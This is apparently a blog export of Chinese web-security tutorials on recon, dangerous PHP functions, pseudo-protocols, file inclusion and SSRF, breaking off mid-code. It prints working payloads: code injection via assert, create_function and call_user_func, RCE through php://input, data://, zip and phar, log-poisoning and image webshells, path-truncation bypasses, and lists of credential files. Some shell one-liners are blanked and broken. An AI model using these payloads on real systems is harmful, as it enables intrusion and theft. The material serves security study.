class="headerlink" title="开放端口"></a>开放端口</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -T4 -sT -p- -sV 127.0.0.1</span><br></pre></td></tr></table></figure><p>常用端口有：</p><p>3306 mysql<br>1433 mssql<br>1521 oracle<br>5432 postgresql<br>6379 redis<br>27017 mongodb<br>8080 tomcat/resin/jetty<br>137 samba<br>873 rsync<br>5900 vnc</p><h2 id="WAF"><a href="#WAF" class="headerlink" title="WAF"></a>WAF</h2><p>从HTTP头部获取WAF信息</p><ul><li><a href="https://github.com/Ekultek/WhatWaf" target="_blank" rel="noopener">https://github.com/Ekultek/WhatWaf</a></li><li><code>wafw00f -a 域名</code></li></ul><h1 id="子域名、C段、旁站"><a href="#子域名、C段、旁站" class="headerlink" title="子域名、C段、旁站"></a>子域名、C段、旁站</h1><h2 id="子域名收集"><a href="#子域名收集" class="headerlink" title="子域名收集"></a>子域名收集</h2><ul><li>暴力枚举<ul><li>(dnsrecon)[<a href="https://github.com/darkoperator/dnsrecon" target="_blank" rel="noopener">https://github.com/darkoperator/dnsrecon</a>]</li><li>subDomainsBrute</li><li>layer子域名挖掘机</li></ul></li><li>搜索引擎<ul><li>site: anemone.top</li><li><a href="https://dnsdumpster.com/" target="_blank" rel="noopener">https://dnsdumpster.com/</a></li><li><a href="https://www.virustotal.com/#/home/search" target="_blank" rel="noopener">VirusTotal</a></li><li>Sublist3r（集合多家搜索引擎结果）</li></ul></li><li>使用SSL/TLS证书查询<ul><li><a href="https://crt.sh/" target="_blank" rel="noopener">https://crt.sh/</a></li><li><a href="https://github.com/appsecco/bugcrowd-levelup-subdomain-enumeration" target="_blank" rel="noopener">bugcrowd-levelup-subdomain-enumeration</a></li><li><a href="https://censys.io/" target="_blank" rel="noopener">https://censys.io/</a></li><li><a href="https://developers.facebook.com/tools/ct/" target="_blank" rel="noopener">https://developers.facebook.com/tools/ct/</a></li><li><a href="https://google.com/transparencyreport/https/ct/" target="_blank" rel="noopener">https://google.com/transparencyreport/https/ct/</a></li></ul></li></ul><h2 id="C站查询"><a href="#C站查询" class="headerlink" title="C站查询"></a>C站查询</h2><ul><li><a href="http://www.webscan.cc/" target="_blank" rel="noopener">http://www.webscan.cc/</a></li><li><a href="http://ipwhois.cnnic.net.cn/" target="_blank" rel="noopener">http://ipwhois.cnnic.net.cn/</a></li><li><code>nmap -p 80,8080 --open ip/24</code></li></ul><h2 id="旁站查询"><a href="#旁站查询" class="headerlink" title="旁站查询"></a>旁站查询</h2><ul><li><a href="http://s.tool.chinaz.com/same" target="_blank" rel="noopener">http://s.tool.chinaz.com/same</a></li></ul><h1 id="网站目录"><a href="#网站目录" class="headerlink" title="网站目录"></a>网站目录</h1><p>可能泄露的目录有：</p><ul><li>网站后台</li><li>网站源代码备份，如:<ul><li>www.rar</li><li>www.zip</li></ul></li><li>版本控制<ul><li>/.git/config （利用：<a href="https://github.com/internetwache/GitTools" target="_blank" rel="noopener">GitTools</a>，<a href="https://github.com/WangYihang/GitHacker" target="_blank" rel="noopener">GitHacker</a>）</li><li>/.svn/entries （利用：Seay SVN漏洞利用工具）</li></ul></li><li>JavaWeb目录<ul><li>/WEB-INF/web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。</li><li>/WEB-INF/classes/：含了站点所有用的 <strong>class</strong> 文件，包括 <strong>servlet</strong> <strong>class</strong> 和非<strong>servlet</strong> <strong>class</strong>，他们不能包含在 .<strong>jar</strong>文件中</li><li>/WEB-INF/lib/：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件</li><li>/WEB-INF/src/：源码目录，按照包名结构放置各个java文件。</li><li>/WEB-INF/database.properties：数据库配置文件</li></ul></li><li>其他敏感文件泄露，如：<ul><li>phpinfo</li><li>robots.txt</li><li>.DS_Store(<a href="https://github.com/lijiejie/ds_store_exp" target="_blank" rel="noopener">https://github.com/lijiejie/ds_store_exp</a>)</li></ul></li></ul><p>推荐工具有：</p><ul><li><a href="https://github.com/maurosoria/dirsearch" target="_blank" rel="noopener">https://github.com/maurosoria/dirsearch</a></li><li>御剑，<a href="http://www.moonsec.com/post-753.html" target="_blank" rel="noopener">http://www.moonsec.com/post-753.html</a></li></ul><h1 id="其他信息"><a href="#其他信息" class="headerlink" title="其他信息"></a>其他信息</h1><ul><li>GitHub源码<ul><li><a href="https://github.com/FeeiCN/GSIL" target="_blank" rel="noopener">https://github.com/FeeiCN/GSIL</a></li></ul></li><li>网络资产搜索引擎：<ul><li><a href="https://fofa.so/" target="_blank" rel="noopener">https://fofa.so/</a></li><li><a href="http://www.yunsee.cn/" target="_blank" rel="noopener">http://www.yunsee.cn/</a></li></ul></li></ul><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ul><li>信息收集总结，<a href="https://blog.csdn.net/qq_33336310/article/details/86665344" target="_blank" rel="noopener">https://blog.csdn.net/qq_33336310/article/details/86665344</a></li><li>Web安全 — 信息收集<a href="https://www.freebuf.com/column/155795.html" target="_blank" rel="noopener">https://www.freebuf.com/column/155795.html</a></li><li>他山之石 | 渗透测试中的各种子域名枚举技术介绍，<a href="https://www.freebuf.com/articles/web/154809.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/154809.html</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 信息收集 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 信息收集 </tag>
            
            <tag> waf探测 </tag>
            
            <tag> cdn绕过 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP中的危险函数和伪协议</title>
      <link href="/php-PHP%E4%B8%AD%E7%9A%84%E5%8D%B1%E9%99%A9%E5%87%BD%E6%95%B0%E5%92%8C%E4%BC%AA%E5%8D%8F%E8%AE%AE/"/>
      <url>/php-PHP%E4%B8%AD%E7%9A%84%E5%8D%B1%E9%99%A9%E5%87%BD%E6%95%B0%E5%92%8C%E4%BC%AA%E5%8D%8F%E8%AE%AE/</url>
      
        <content type="html"><![CDATA[<p>复习一下PHP中常见的危险函数：</p><h1 id="文件读取"><a href="#文件读取" class="headerlink" title="文件读取"></a>文件读取</h1><ul><li><p>file_get_contents()，该函数可以读取其他协议造成SSRF</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$src=$_GET[<span class="string">'src'</span>];</span><br><span class="line">$homepage = file_get_contents($src);</span><br><span class="line"><span class="keyword">echo</span> $homepage;</span><br></pre></td></tr></table></figure></li><li><p>highlight_file()，高亮显示文件内容</p></li><li>show_source()，highlight_file()的别名</li><li>fopen()、fread()，fgets()、fgetss()、fpassthru()等<ul><li>fread(fopen($filename,”r”), $size); //读取<code>$size</code>长度的文件</li><li>fgets(fopen($filename, “r”)); //读取一行</li><li>fgetss(fopen($filename, “r”)); //读取一行并过滤HTML标记</li><li>fpassthru(fopen($filename, “r”)); //读取到文件结束</li></ul></li><li><p>readfile()，读取文件并返回至页面</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$file = $_GET[<span class="string">'file'</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (file_exists($file)) &#123;</span><br><span class="line">    header(<span class="string">'Content-Description: File Transfer'</span>);</span><br><span class="line">    header(<span class="string">'Content-Type: application/octet-stream'</span>);</span><br><span class="line">    header(<span class="string">'Content-Disposition: attachment;   filename="'</span>.basename($file).<span class="string">'"'</span>);</span><br><span class="line">    header(<span class="string">'Expires: 0'</span>);</span><br><span class="line">    header(<span class="string">'Cache-Control: must-revalidate'</span>);</span><br><span class="line">    header(<span class="string">'Pragma: public'</span>);</span><br><span class="line">    header(<span class="string">'Content-Length: '</span> . filesize($file));</span><br><span class="line">    readfile($file);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>file()，把文件读进数组中</p></li><li>php_strip_whitespace()，读取一个php文件并返回一个去掉注释和换行的文本，有意思的是，该函数可以去掉任意语言的注释，只要这个语言的注释风格与php相同并且在文件头加入<code>&lt;?php</code>就行可：<br><img src="/php-PHP中的危险函数和伪协议/1549526799636.png" alt="1549526799636"></li><li>parse_ini_file()，只能读取ini文件</li></ul><a id="more"></a><h1 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h1><ul><li>system()</li><li>shell_exec()，和<code>system()</code>差不多</li><li>passthru()，返回二进制的输出</li><li>exec(‘ls’, $array)，返回结果保存在<code>array</code>中</li><li>pcntl_exec()，不返回结果</li><li><p>popen()，返回一个文件指针</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$handle = popen(<span class="string">"/bin/ls"</span>, <span class="string">"r"</span>);</span><br><span class="line">var_dump(fpassthru($handle));</span><br><span class="line">pclose($handle);</span><br></pre></td></tr></table></figure></li><li><p>proc_open()，增强型<code>popen()</code>，允许有三个通道（输入，输出，错误）</p></li><li>&#96;(反单引号)</li><li>escapeshellcmd() // 该函数用于过滤字符保证不执行其他恶意指令</li></ul><h1 id="代码执行"><a href="#代码执行" class="headerlink" title="代码执行"></a>代码执行</h1><ul><li>eval(“phpinfo();”)</li><li><p>assert()，原用法是assert失败后，调用回调函数，它会将参数作为代码执行。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$num=$_GET[<span class="string">'num'</span>];</span><br><span class="line">assert(<span class="string">"is_int($num)"</span>);</span><br></pre></td></tr></table></figure><p>payload为<code>num=1)%20and%20phpinfo();//</code>，注意若前面的条件不满足则用or，如<code>a)%20or%20phpinfo();//</code></p></li><li><p>preg_replace + ‘/e’,/e 修正符使 preg_replace() 将 replacement 参数当作 PHP 代码，如</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> preg_replace(<span class="string">"/test/e"</span>,$_GET[<span class="string">"cmd"</span>],<span class="string">"just test"</span>);</span><br></pre></td></tr></table></figure><p>payload为<code>cmd=phpinfo()</code>，注意该方法只在php 5.5.0以下版本有效。</p></li><li><p>create_function($args, ​$code)，创建一个匿名函数，由于内部是eval实现的，所以存在安全性问题，如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$sort_by = $_GET[<span class="string">'sort_by'</span>];</span><br><span class="line">$databases=<span class="keyword">array</span>(<span class="string">'1234'</span>,<span class="string">'4321'</span>);</span><br><span class="line">$sort_function = <span class="string">'return strcmp($a["'</span>.$sort_by.<span class="string">'"], $b["'</span>.$sort_by.<span class="string">'"]);'</span>;</span><br><span class="line">usort($databases, create_function(<span class="string">'$a, $b'</span>, $sort_function));</span><br><span class="line">print_r($databases);</span><br></pre></td></tr></table></figure><p>构造payload的关键在于将create_function还原为eval实现的普通函数，接着按上下文闭合先前的函数逻辑（这里为strcmp）再加上其他语句<code>;}phpinfo();/*</code>，总之确保eval中的字符串拼接成一个php符合语法的语句：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">eval</span>(</span><br><span class="line">    <span class="string">'function lambda($a, $b)&#123;</span></span><br><span class="line"><span class="string">        return strcmp($a["'</span>.$sort_by.<span class="string">'"], $b["'</span>.$sort_by.<span class="string">'"]); //replace with create_function</span></span><br><span class="line"><span class="string">    &#125;'</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>由此payload为<code>sort_by=&quot;]);}phpinfo();/*</code>，此时eval中的字符串拼接成：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">lambda</span><span class="params">($a, $b)</span></span>&#123; </span><br><span class="line"><span class="keyword">return</span> strcmp($a[<span class="string">""</span>]);</span><br><span class="line">&#125;</span><br><span class="line">phpinfo();<span class="comment">/*"], $b[""]);&#125;phpinfo();/*"]); &#125;</span></span><br></pre></td></tr></table></figure></li><li><p>call_user_func(callable $func, $arg)，调用func($arg)，若func可指定为assert则存在代码执行：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$a=$_GET[<span class="string">'a'</span>];</span><br><span class="line">$b=$_GET[<span class="string">'b'</span>];</span><br><span class="line">call_user_func($a, $b);</span><br></pre></td></tr></table></figure><p>payload为<code>a=assert&amp;b=phpinfo()</code></p></li><li><p>call_user_func_array(callable $func , array $args_arr)，调用func，参数为数组<code>$args_arr</code>:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$a=$_GET[<span class="string">'a'</span>];</span><br><span class="line">$b=$_GET[<span class="string">'b'</span>];</span><br><span class="line">call_user_func_array($a, $b);</span><br></pre></td></tr></table></figure><p>payload为<code>a=assert&amp;b[]=phpinfo()</code></p></li><li><p>array_map(callable $func, array $array1 [, array $… ])，将array中的元素应用到$callback函数上，有点像Python的map</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$a=$_GET[<span class="string">'a'</span>];</span><br><span class="line">$b=$_GET[<span class="string">'b'</span>];</span><br><span class="line">array_map($a, $b);</span><br></pre></td></tr></table></figure><p>payload为<code>a=assert&amp;b[]=phpinfo()</code></p></li><li>ob_start()，用法如下（只能显示一行）：<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$cmd = <span class="string">'system'</span>;ob_start($cmd);<span class="keyword">echo</span> <span class="string">"$_GET[a]"</span>;ob_end_flush();</span><br></pre></td></tr></table></figure></li></ul><h1 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h1><ul><li>move_uploaded_file()</li><li>getimagesize() //验证文件头只要为GIF89a，就会返回真</li></ul><h1 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h1><ul><li>require()，程序一运行就包含该文件</li><li>include()，执行到include时包含该文件</li><li>require_once()，include_once()：若已包含过则不再包含</li><li>allow_url_include = on，打开远程文件包含</li></ul><h1 id="变量覆盖"><a href="#变量覆盖" class="headerlink" title="变量覆盖"></a>变量覆盖</h1><ul><li>extract()</li><li>import_request_variables()</li><li>parse_str()</li><li>mb_parse_str()<br>全局变量覆盖：register_globals为ON，$GLOBALS</li></ul><h1 id="伪协议"><a href="#伪协议" class="headerlink" title="伪协议"></a>伪协议</h1><ul><li><p>php://filter，结合base64读取文件用，如：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ curl http://localhost/include.php?file=php://filter/<span class="built_in">read</span>=convert.base64-encode/resource=include.php|base64 -d</span><br><span class="line">  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current</span><br><span class="line">                                 Dload  Upload   Total   Spent    Left  Speed</span><br><span class="line">100    45  100    45    0     0   5000      0 --:--:-- --:--:-- --:--:--  5000</span><br><span class="line">&lt;?php include(<span class="variable">$_GET</span>[<span class="string">'file'</span>]);?&gt;</span><br></pre></td></tr></table></figure></li><li><p>php://input，将post作为输入，在<strong>远程文件包含</strong>和file_get_contents()时可以利用造成RCE，如：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ curl -X POST http://localhost/include.php?file=php://input --data <span class="string">"&lt;?php system('ls -al');?&gt;"</span></span><br><span class="line">total 126</span><br><span class="line">drwxr-xr-x 1 Anemone 197121     0 Feb  8 11:22 .</span><br><span class="line">drwxr-xr-x 1 Anemone 197121     0 May  6  2018 ..</span><br><span class="line">-rw-r--r-- 1 Anemone 197121 27877 Sep 21 20:56 1075875011_1.jpg</span><br><span class="line">-rw-r--r-- 1 Anemone 197121 27877 Sep 21 20:58 852730535_1.jpg</span><br><span class="line">-rw-r--r-- 1 Anemone 197121  2117 Sep 21 21:53 aizhixi.php</span><br></pre></td></tr></table></figure></li><li><p>data://，将data后的get请求作为输入，在<strong>远程文件包含</strong>时可造成RCE，如：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">echo</span> <span class="string">"&lt;?php system('ls -al');?&gt;"</span>|base64</span><br><span class="line">PD9waHAgc3lzdGVtKCdscyAtYWwnKTs/Pgo=</span><br><span class="line"></span><br><span class="line">$ curl <span class="string">"http://localhost/include.php?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdscyAtYWwnKTs/Pgo="</span></span><br><span class="line">total 126</span><br><span class="line">drwxr-xr-x 1 Anemone 197121     0 Feb  8 11:22 .</span><br><span class="line">drwxr-xr-x 1 Anemone 197121     0 May  6  2018 ..</span><br><span class="line">-rw-r--r-- 1 Anemone 197121 27877 Sep 21 20:56 1075875011_1.jpg</span><br><span class="line">-rw-r--r-- 1 Anemone 197121 27877 Sep 21 20:58 852730535_1.jpg</span><br><span class="line">-rw-r--r-- 1 Anemone 197121  2117 Sep 21 21:53 aizhixi.php</span><br></pre></td></tr></table></figure></li><li><p>zip://、compress.bzip2://、compress.zlib://，读取一个.zip/.bz2/.gz文件中的文件，可以将一句话压缩造成RCE：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">echo</span> <span class="string">"&lt;?php echo system('ls -al');?&gt;"</span> &gt; ls.php</span><br><span class="line">$ zip -r shell.zip ls.php</span><br><span class="line">  adding: ls.php (stored 0%)</span><br><span class="line"><span class="comment"># 上传后</span></span><br><span class="line">$ curl <span class="string">"http://localhost/include.php?file=phar://./shell.zip/ls.php"</span></span><br><span class="line">total 128</span><br><span class="line">drwxr-xr-x 1 Anemone 197121     0 Feb  8 16:11 .</span><br><span class="line">drwxr-xr-x 1 Anemone 197121     0 May  6  2018 ..</span><br><span class="line">-rw-r--r-- 1 Anemone 197121 27877 Sep 21 20:56 1075875011_1.jpg</span><br><span class="line">-rw-r--r-- 1 Anemone 197121 27877 Sep 21 20:58 852730535_1.jpg</span><br></pre></td></tr></table></figure></li><li><p>phar://，读取一个phar/zip文件，可以利用成RCE:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$ cat phar.php</span><br><span class="line">&lt;?php</span><br><span class="line">                                                                                                   ?&gt;<span class="string">' ;</span></span><br><span class="line"><span class="string">$phar-&gt;setStub('</span>&lt;?php __HALT_COMPILER();?&gt;<span class="string">');</span></span><br><span class="line"><span class="string">?&gt;</span></span><br><span class="line"><span class="string">$ php phar.php</span></span><br><span class="line"><span class="string"># 上传phar后</span></span><br><span class="line"><span class="string">$ curl "http://localhost/include.php?file=phar://./shell.phar/shell.php" --data "cmd=system('</span>ls -al<span class="string">');"</span></span><br><span class="line"><span class="string">12321total 128</span></span><br><span class="line"><span class="string">drwxr-xr-x 1 Anemone 197121     0 Feb  8 16:11 .</span></span><br><span class="line"><span class="string">drwxr-xr-x 1 Anemone 197121     0 May  6  2018 ..</span></span><br><span class="line"><span class="string">-rw-r--r-- 1 Anemone 197121 27877 Sep 21 20:56 1075875011_1.jpg</span></span><br><span class="line"><span class="string">-rw-r--r-- 1 Anemone 197121 27877 Sep 21 20:58 852730535_1.jpg</span></span><br></pre></td></tr></table></figure></li></ul><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ul><li>php代码审计小总结，<a href="https://chybeta.github.io/2017/07/14/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%B0%8F%E6%80%BB%E7%BB%93/" target="_blank" rel="noopener">https://chybeta.github.io/2017/07/14/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%B0%8F%E6%80%BB%E7%BB%93/</a></li><li>命令执行与代码执行的小结，<a href="https://www.anquanke.com/post/id/162128" target="_blank" rel="noopener">https://www.anquanke.com/post/id/162128</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> PHP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件包含漏洞利用</title>
      <link href="/php-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%88%A9%E7%94%A8/"/>
      <url>/php-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%88%A9%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="本地文件包含"><a href="#本地文件包含" class="headerlink" title="本地文件包含"></a>本地文件包含</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">include</span>($_GET[<span class="string">'file'</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="文件读取"><a href="#文件读取" class="headerlink" title="文件读取"></a>文件读取</h2><p>本地文件包含可以作为文件读取使用：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ curl http://127.0.0.1/include.php?file=/etc/passwd</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class="line">...</span><br></pre></td></tr></table></figure><a id="more"></a><p>可读如下敏感文件：</p><ul><li>Windows:<ul><li>C:\boot.ini    //查看系统版本</li><li>C:\Windows\System32\inetsrv\MetaBase.xml    //IIS配置文件</li><li>C:\Windows\repair\sam        //存储系统初次安装的密码</li><li>C:\Program Files\mysql\my.ini         //Mysql配置</li><li>C:\Program Files\mysql\data\mysql\user.MYD    //Mysql root</li><li>C:\Windows\php.ini    //php配置信息</li><li>C:\Windows\my.ini        //Mysql配置信息</li></ul></li><li>Linux:<ul><li>~/.ssh/authorized_keys</li><li>/etc/passwd</li><li>/etc/my.cnf</li><li>/etc/httpd/conf/httpd.conf</li><li>/var/log/apache2/access.log</li><li>/var/log/httpd/access_log</li></ul></li></ul><h2 id="包含图片马GetShell"><a href="#包含图片马GetShell" class="headerlink" title="包含图片马GetShell"></a>包含图片马GetShell</h2><p>首先上传图片马img.gif:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GIF89a <span class="meta">&lt;?php</span> phpinfo();<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>然后包含图片马，后缀名无限制：</p><p><img src="/php-文件包含利用/1549593738249.png" alt="1549593738249"></p><h2 id="包含日志GetShell"><a href="#包含日志GetShell" class="headerlink" title="包含日志GetShell"></a>包含日志GetShell</h2><p>先访问<code>/include.php?file=&lt;?=&#96;ls&#96;?&gt;</code>，将命令写入日志。</p><p><img src="/php-文件包含利用/1549594868535.png" alt="1549594868535"></p><p>再包含日志GetShell：</p><p><img src="/php-文件包含利用/1549594747532.png" alt="1549594747532"></p><h2 id="php-filter"><a href="#php-filter" class="headerlink" title="php://filter"></a>php://filter</h2><p><code>php://filter</code>可以用来结合base64读取php源代码，payload为：<code>php://filter/read=convert.base64-encode/resource=include.php</code></p><p><img src="/php-文件包含利用/1549595279613.png" alt="1549595279613"></p><h2 id="绕过限制"><a href="#绕过限制" class="headerlink" title="绕过限制"></a>绕过限制</h2><ul><li>%00截断<ul><li>?file=../../../etc/pwd%00</li></ul></li><li>路径长度阶段<ul><li>?file=../../../etc/pwd/././.[…]/././.</li><li>?file=../../../boot.ini/….[…]………</li></ul></li></ul><h1 id="远程文件包含"><a href="#远程文件包含" class="headerlink" title="远程文件包含"></a>远程文件包含</h1><p>需要All_url_fopen=On(默认开启)和Allow_url_include=On(默认关闭)</p><h2 id="直接包含远程一句话"><a href="#直接包含远程一句话" class="headerlink" title="直接包含远程一句话"></a>直接包含远程一句话</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/include.php?file=http://127.0.0.2/a.txt</span><br></pre></td></tr></table></figure><p>a.txt:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>                                                         <span class="meta">?&gt;</span><span class="string">") ?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="php-input"><a href="#php-input" class="headerlink" title="php://input"></a>php://input</h2><p><code>php://input</code>可以将post部分请求作为一个php的只读文件流</p><p><img src="/php-文件包含利用/1549596283877.png" alt="1549596283877"></p><p>生成一句话payload:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>                                                            <span class="meta">?&gt;</span><span class="string">") ?&gt;</span></span><br></pre></td></tr></table></figure><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ul><li>PHP文件包含漏洞，<a href="https://www.cnblogs.com/lazy0/p/1e9caec7bfdc3a3291ebeefb8923549d.html" target="_blank" rel="noopener">https://www.cnblogs.com/lazy0/p/1e9caec7bfdc3a3291ebeefb8923549d.html</a></li><li>文件包含漏洞，<a href="https://www.cnblogs.com/bmjoker/p/9035259.html" target="_blank" rel="noopener">https://www.cnblogs.com/bmjoker/p/9035259.html</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> PHP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SSRF成因、利用和防御</title>
      <link href="/ssrf-SSRF%E6%88%90%E5%9B%A0%E3%80%81%E6%94%BB%E5%87%BB%E5%92%8C%E9%98%B2%E5%BE%A1/"/>
      <url>/ssrf-SSRF%E6%88%90%E5%9B%A0%E3%80%81%E6%94%BB%E5%87%BB%E5%92%8C%E9%98%B2%E5%BE%A1/</url>
      
        <content type="html"><![CDATA[<h1 id="SSRF成因"><a href="#SSRF成因" class="headerlink" title="SSRF成因"></a>SSRF成因</h1><p>SSRF是指存在漏洞的服务器存在对外发起请求的功能，而请求源可由攻击者控制并且服务器本身没有做合法验证，诸如如下代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?PHP</span></span><br><span class="line">    $url = $_GET[<span class="string">'url'</span>];</span><br><span class="line">    $ch = CURL_INIT();</span><br><span class="line">    CURL_SETOPT($ch, CURLOPT_URL, $url);</span><br><span class="line">    CURL_SETOPT($ch, CURLOPT_HEADER, <span class="keyword">FALSE</span>);</span><br><span class="line">    CURL_SETOPT($ch, CURLOPT_RETURNTRANSFER, <span class="keyword">TRUE</span>);</span><br><span class="line">    CURL_SETOPT($ch, CURLOPT_SSL_VERIFYPEER, <span class="keyword">FALSE</span>);</span><br><span class="line">    <span class="comment">// 允许302跳转</span></span><br><span class="line">    CURL_SETOPT($ch, CURLOPT_FOLLOWLOCATION, <span class="keyword">TRUE</span>);</span><br><span class="line">    $res = CURL_EXEC($ch);</span><br><span class="line">    <span class="comment">// 设置CONTENT-TYPE</span></span><br><span class="line">    CURL_CLOSE($ch) ;</span><br><span class="line">    <span class="comment">//返回响应</span></span><br><span class="line">    <span class="keyword">echo</span> $res;</span><br><span 